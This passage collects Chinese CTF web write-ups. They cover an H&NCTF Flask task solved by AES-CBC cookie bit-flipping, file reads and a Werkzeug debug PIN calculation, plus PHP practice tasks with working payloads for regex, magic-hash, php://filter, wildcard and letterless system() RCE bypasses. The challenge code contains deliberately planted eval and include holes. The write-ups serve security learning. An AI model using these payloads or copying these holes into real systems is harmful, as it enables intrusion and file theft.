class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">default_session = <span class="string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span></span><br><span class="line">key = get_random_bytes(AES.block_size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">session</span>):</span><br><span class="line">    iv = get_random_bytes(AES.block_size)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> b64encode(iv + cipher.encrypt(pad(session.encode(<span class="string">&#x27;utf-8&#x27;</span>), AES.block_size)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">session</span>):</span><br><span class="line">    raw = b64decode(session)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">filename_blacklist = &#123;</span><br><span class="line">    <span class="string">&#x27;self&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cgroup&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mountinfo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;env&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        res = Response(</span><br><span class="line">            <span class="string">&quot;welcome to the FlipPIN server try request /hint to get the hint&quot;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;session&#x27;</span>, encrypt(default_session).decode())</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;have a fun&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/hint&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line">    res = Response(<span class="built_in">open</span>(__file__).read(), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/read&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>():</span><br><span class="line"></span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        res = Response(<span class="string">&quot;you are not logged in&quot;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;session&#x27;</span>, encrypt(default_session))</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        plain_session = decrypt(session)</span><br><span class="line">        <span class="keyword">if</span> plain_session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;don\&#x27;t hack me&#x27;</span></span><br><span class="line"></span><br><span class="line">        session_data = json.loads(plain_session)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> session_data[<span class="string">&#x27;admin&#x27;</span>] :</span><br><span class="line">            filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(blacklist_str <span class="keyword">in</span> filename <span class="keyword">for</span> blacklist_str <span class="keyword">in</span> filename_blacklist):</span><br><span class="line">                abort(<span class="number">403</span>, description=<span class="string">&#x27;Access to this file is forbidden.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">return</span> f.read()</span><br><span class="line">            <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">                abort(<span class="number">404</span>, description=<span class="string">&#x27;File not found.&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                abort(<span class="number">500</span>, description=<span class="string">f&#x27;An error occurred: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;You are not an administrator&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">9091</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>审计一下代码，可以知道是AES-CBC字节反转攻击<br><code>&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;</code> 将0变为1，满足 &#x2F;read 身份是admin，然后可以读文件</p><p>写下脚本得到需要的session</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"></span><br><span class="line">default_session = <span class="string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span></span><br><span class="line">session=<span class="string">&#x27;xkDYjXtSgdqI9HuG1z5F8ubtla4c32Twbrfi7N84YlMhrezP813h0rZr8jW41C7bHTFgEkk6tg5aNGfczF4Yrg==&#x27;</span></span><br><span class="line"><span class="comment"># 自己可以在浏览器中查看session，更改</span></span><br><span class="line">c = <span class="built_in">bytearray</span>(b64decode(session))</span><br><span class="line">c[default_session.index(<span class="string">&quot;0&quot;</span>)] ^= <span class="number">1</span></span><br><span class="line">session_1 = b64encode(c).decode()</span><br><span class="line"><span class="built_in">print</span>(session_1)</span><br><span class="line"><span class="comment"># 将生成的session替换原来的session</span></span><br></pre></td></tr></table></figure><p>然后就可以在 &#x2F;read 路由读取文件了，然后根据相应的信息利用脚本计算 pin值 </p><p>报错得到 app.py的绝对路径  ：<code> /usr/lib/python3.9/site-packages/flask/app.py</code></p><p><img src="/2024/06/03/H&NCTF/image-20240531200458979.png" alt="image-20240531200458979"></p><p>&#x2F;etc&#x2F;passwd 路径得到username为  ctfUser</p><p><img src="/2024/06/03/H&NCTF/image-20240531200124285.png" alt="image-20240531200124285"></p><p>在 &#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address 路径下得到mac地址 将他们转为十进制就行  2485377892355</p><p><img src="/2024/06/03/H&NCTF/image-20240531200641254.png" alt="image-20240531200641254"></p><p>在 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id 路径得到  machine_id 的一部分  9fd11036-6c2e-41c7-bb26-7d358f670070</p><p><img src="/2024/06/03/H&NCTF/image-20240531200955568.png" alt="image-20240531200955568"></p><p>在 &#x2F;proc&#x2F;1&#x2F;cpuset 路径得到 machine_id 的另一部分 &#x2F;proc&#x2F;self&#x2F;cgroup被禁了，所以使用&#x2F;proc&#x2F;1&#x2F;cpuset代替</p><p>7ccce9739d1066ac3e17dd56a2cb89f74493eaa4c485c19072536d3577063b71</p><p><img src="/2024/06/03/H&NCTF/image-20240531201117936.png" alt="image-20240531201117936"></p><p>计算pin值的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;ctfUser&#x27;</span><span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;/usr/lib/python3.9/site-packages/flask/app.py&#x27;</span> <span class="comment"># 报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377892355&#x27;</span>,<span class="comment">#  /sys/class/net/eth0/address 16进制转10进制</span></span><br><span class="line">    <span class="comment">#machine_id由两个合并(docker就后两个)：1./proc/sys/kernel/random/boot_id      2./proc/self/cgroup 由于cgroup和mountinfo被禁用,则用/proc/1/cpuset代替读取</span></span><br><span class="line">    <span class="string">&#x27;9fd11036-6c2e-41c7-bb26-7d358f670070&#x27;</span>+<span class="string">&#x27;7ccce9739d1066ac3e17dd56a2cb89f74493eaa4c485c19072536d3577063b71&#x27;</span><span class="comment">#  /proc/sys/kernel/random/boot_id + /proc/1/cpuset</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>  进入&#x2F;console 路由输入得到的pin值 618-860-418</p><p><img src="/2024/06/03/H&NCTF/image-20240531202844435.png" alt="image-20240531202844435"></p><p>import os<br>os.environ  得到flag<br>(通过os.popen(‘ls’).read() 可以列出文件有flag文件，但是没有读取权限)</p><p><img src="/2024/06/03/H&NCTF/image-20240531203004830.png" alt="image-20240531203004830"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>交流练习——week1--web</title>
      <link href="/2024/05/26/%E4%BA%A4%E6%B5%81%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94week1--web/"/>
      <url>/2024/05/26/%E4%BA%A4%E6%B5%81%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94week1--web/</url>
      
        <content type="html"><![CDATA[<h3 id="ezPhp"><a href="#ezPhp" class="headerlink" title="ezPhp"></a>ezPhp</h3><p>(自己找之前做过的题目拼凑改编出的)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ruheraoguo/&#x27;</span>, <span class="variable">$a</span> . <span class="string">&#x27;hello&#x27;</span>) &amp;&amp; <span class="variable">$a</span> != <span class="string">&#x27;ruheraoguo&#x27;</span> &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>, <span class="variable">$b</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;so easy&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$o_k_k</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;o_k_k&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/%5f|_|\.|%2E/i&#x27;</span>, <span class="variable">$query</span>) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$o_k_k</span>) == <span class="variable">$o_k_k</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;nice&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ruheraoguo/&#x27;</span>, <span class="variable">$a</span> . <span class="string">&#x27;hello&#x27;</span>) &amp;&amp; <span class="variable">$a</span> != <span class="string">&#x27;ruheraoguo&#x27;</span></span><br></pre></td></tr></table></figure><p>preg_match的绕过，\n 或者%0a , 都可以<br> a&#x3D;ruheraoguo%0a</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>, <span class="variable">$b</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$b</span>)</span><br></pre></td></tr></table></figure><p>intval() 对于非空的 array 返回 1，且数组可以绕过preg_match，使其返回false<br>b[]&#x3D;1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/_|%5f|\.|%2E|\[|%5B/i&#x27;</span>, <span class="variable">$a</span>) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$o_k_k</span>) == <span class="variable">$o_k_k</span></span><br></pre></td></tr></table></figure><p>php的非法传参，空格会被转换成  _<br>双MD5（$a&#x3D;&#x3D;md5($a)）, 以0e开头的字符串进过MD5加密后依旧以0e开头<br>网上可以找到很多这样的字符串<br>o k k&#x3D;0e00506035745</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>利用 SplFileObject 配合php伪协议 读取文件</p><p>a&#x3D;SplFileObject&amp;b&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><h3 id="is-php"><a href="#is-php" class="headerlink" title="is_php"></a>is_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span><span class="string">&#x27;hint.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hhh&#x27;</span>])) </span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable">$hhh</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/^(.*)level(.*)$/&#x27;</span>, <span class="string">&#x27;$&#123;1&#125;&lt;!-- nonono --&gt;$&#123;2&#125;&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;hhh&#x27;</span>]);</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/pass_level_1/&#x27;</span>, <span class="variable">$hhh</span>))&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$level2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;no&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;???&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> ???</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?a=system&amp;b=cat [a-z][a-z][a-z][a-z][a-z][a-z][a-z][a-z]ag.php</span><br><span class="line">    </span><br><span class="line">通配符的绕过，过滤了 ? 和 * </span><br><span class="line">利用 [a-z] 匹配在a-z之间的字符   </span><br></pre></td></tr></table></figure><p>flag{sfs-kihk-j2sd-aas}</p><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><h4 id="level1-php"><a href="#level1-php" class="headerlink" title="level1.php"></a>level1.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;happy.php&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>]==<span class="string">&quot;Genshin_Impact&quot;</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$yy</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pai&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pai&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">require_once</span>(<span class="variable">$yy</span>);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You should to play Genshin Impact!&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> You should to play Genshin Impact!</span><br></pre></td></tr></table></figure><p>require_once的绕过，多级符号软链接<br>&#x2F;proc&#x2F;self指向当前进程的&#x2F;proc&#x2F;pid&#x2F;，&#x2F;proc&#x2F;self&#x2F;root&#x2F;是指向&#x2F;的符号链接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?pai=php:<span class="comment">//filter/convert.base64-</span></span><br><span class="line">encode/resource=/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/<span class="keyword">var</span>/www/html/happy.php</span><br></pre></td></tr></table></figure><h4 id="Levv-vve-ve2-php"><a href="#Levv-vve-ve2-php" class="headerlink" title="Levv_vve_ve2.php"></a>Levv_vve_ve2.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flower</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;lily&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$flower</span>)) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;you can&#x27;t use it&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$flower</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>无字母rce取反</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;\n\n&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;cat /fllll1laggg.php&#x27;</span>);</span><br><span class="line"><span class="comment">//%8C%86%8C%8B%9A%92\n\n%9C%9E%8B%DF%D0%99%93%93%93%93%CE%93%9E%98%98%98%D1%8F%97%8F</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?lily=(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">8</span>B%DF%D0%<span class="number">99</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">93</span>%CE%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>%D1%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F);</span><br><span class="line">--&gt; <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /fllll1laggg.php&quot;</span>);</span><br></pre></td></tr></table></figure><p>flag{Th1s_@a_TesT_fll1llag}</p><h3 id="caiji"><a href="#caiji" class="headerlink" title="caiji"></a>caiji</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span>=<span class="string">&quot;nulijiuhui&quot;</span>;</span><br><span class="line"><span 